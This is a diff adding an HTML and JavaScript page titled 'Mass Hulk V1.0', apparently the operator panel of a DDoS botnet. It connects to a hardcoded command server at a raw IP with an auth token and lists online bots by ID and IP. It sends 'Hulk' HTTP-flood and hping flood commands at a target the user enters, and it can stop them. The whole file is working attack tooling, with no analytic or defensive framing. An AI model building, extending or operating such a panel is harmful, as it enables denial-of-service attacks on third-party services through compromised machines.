@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://bootswatch.com/4/darkly/bootstrap.min.css" crossorigin="anonymous">
+
+    <title>Mass Hulk V1.0</title>
+</head>
+<body>
+    <div class="container">
+        <div class="row mt-5">
+            <div class="col-lg-4 m-auto text-center">
+                <p class="h1">Hx2</p>
+                <div class="card">
+                    <div class="card-body">
+                      <h5 class="card-title">Server status</h5>
+                      <h6 class="card-subtitle mb-2 text-muted" id="connection"> 
+                        <div class="spinner-border spinner-border-sm text-warning" role="status">
+                            <span class="sr-only">Loading...</span>
+                        </div>
+                        connecting ...
+                      </h6>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row mt-5">
+            <div class="col-lg-6">
+                <div style="height:60vh; overflow: scroll;" class="card card-body">
+                    <h5 class="card-title text-uppercase">Botnet status</h5>
+                    <h6 class="card-subtitle mb-2 text-muted" id="bots_count"></h6>
+                    <div  id="bots_container">
+                        <div class="d-flex justify-content-center">
+                            <div class="spinner-border" role="status">
+                              <span class="sr-only">Loading...</span>
+                            </div>
+                          </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-lg-6">
+                <div class="card card-body">
+                    <h5 class="card-title text-uppercase">Attack Manager</h5>
+                    <form>
+                        
+                        <div id="target_info" class="mt-2">
+                            
+                        </div>
+                        
+                        <div class="form-group mt-3 mb-2">
+                            <label class="text-uppercase mb-2" for="attackInfoHulk">Attack Target</label>
+                            <input type="text" id="attackInfoHulk" class="form-control"  placeholder="Hulk URL">
+                            <div class="float-center">
+                                <button id="attackBtnHulk" type="button" class="btn btn-danger mt-2 mb-2 text-uppercase">Hulk Attack</button>
+                            </div>
+                            
+                            <input type="text" id="attackInfoHping" class="form-control"  placeholder="Hping attack args">
+                            <div class="float-center">
+                                <button id="attackBtnHping" type="button" class="btn btn-danger mt-2 text-uppercase">Hping Attack</button>
+                            </div>
+                            
+                        </div>
+
+                        <button id="stopBtn" type="button" class="btn btn-lg btn-block btn-primary mt-2 text-uppercase">Stop Attacks</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.1/socket.io.js" integrity="sha512-AcZyhRP/tbAEsXCCGlziPun5iFvcSUpEz2jKkx0blkYKbxU81F+iq8FURwPn1sYFeksJ+sDDrI5XujsqSobWdQ==" crossorigin="anonymous"></script>
+    <script>
+
+        document.getElementById("attackBtnHulk").addEventListener("click", submitAttackHulk);
+        document.getElementById("attackBtnHping").addEventListener("click", submitAttackHping);
+        document.getElementById("stopBtn").addEventListener("click", stopAttack);
+
+        //Socket connection init 
+        const socket = io("http://202.182.122.143:3000/manager", {
+            transportOptions: {
+            polling: {
+                extraHeaders: {
+                'auth': "65ebb4ce0fbdad63f516815bf4f6ce3f"
+                }
+            }
+            }
+        })
+
+        socket.on('connect', () => {
+            setConnectionStatus(true);
+            socket.on('bots', (bots) => {
+                updateBotTable(bots);
+            })
+            socket.on('target', (target) => {
+                updateTarget(target);
+            })
+            socket.on('disconnect', () => {
+                setConnectionStatus(false);
+            })
+        })
+
+
+        function updateBotTable(bots) {
+
+            html = '<table class="table table-sm"><thead><tr><th scope="col">#</th><th scope="col">ID</th><th scope="col">IP</th></tr></thead> <tbody>'
+
+            bots.forEach((bot, index) => {
+                let num = index + 1;
+                html += '<tr><th scope="row">'+num+'</th><th scope="row">'+bot.id+'</th><td>'+bot.ip+'</td></tr>'
+            });
+
+            html += '</tbody></table>';
+
+            document.getElementById("bots_count").innerHTML = "ONLINE: "+bots.length;
+            document.getElementById("bots_container").innerHTML = html;
+        }
+
+        function setConnectionStatus(status) {
+            if(status) {
+                document.querySelector("#connection").innerHTML = '<div class="spinner-grow spinner-grow-sm text-success" role="status"><span class="sr-only">on</span></div> Online'
+            } else {
+                document.querySelector("#connection").innerHTML = '<div class="spinner-grow spinner-grow-sm text-danger" role="status"><span class="sr-only">on</span></div> Offline'
+            }
+
+        }
+
+        function updateTarget(target) {
+            if(!target == '') {
+                let tmptarget = JSON.parse(target)
+                console.log(tmptarget)
+                if(tmptarget.type == "hulk") {
+                  document.querySelector("#target_info").innerHTML = '<strong> <div class="spinner-grow text-danger spinner-grow-sm" role="status"> <span class="sr-only">Loading...</span></div>&nbsp;HULK---> '+tmptarget.target+'</strong>';
+                } else {
+                  document.querySelector("#target_info").innerHTML = '<strong> <div class="spinner-grow text-danger spinner-grow-sm" role="status"> <span class="sr-only">Loading...</span></div>&nbsp;HPING---> '+tmptarget.args+'</strong>';
+                }
+                
+            } else {
+                document.querySelector("#target_info").innerHTML = '<strong> not_attacking: IDLE </strong>'
+            }   
+        }
+
+        function submitAttackHulk() {
+          let target = document.getElementById("attackInfoHulk").value;
+          if(!target == ""){
+            try {
+              
+              let payload = {type: "hulk", target: target, args: ""}
+              console.log(payload)
+              socket.emit('attack', JSON.stringify(payload));
+    
+            } catch (error) {
+                console.log(error)
+                alert("Error, submitting target.", error)
+            }
+            
+            } else {
+              alert("Please define a target to continue");
+            }
+
+        }
+
+        function submitAttackHping() {
+            let args = document.getElementById("attackInfoHping").value;
+            if(!args == "") {
+              try {
+                
+                let payload = {type: "hping", target: "", args: args}
+                console.log(payload)
+                socket.emit('attack', JSON.stringify(payload));
+                
+              } catch (error) {
+                  console.log(error)
+                  alert("Error, submitting target.", error)
+              }
+            } else {
+              alert("Please add commands to continue");
+            }
+            
+
+        }
+
+        function stopAttack() {
+
+            try {
+                let task = "";
+                socket.emit('attack', task)
+                
+            } catch (error) {
+                alert("Error, stopping attack.")
+            }
+
+        }
+
+    </script>
+</body>
+</html>
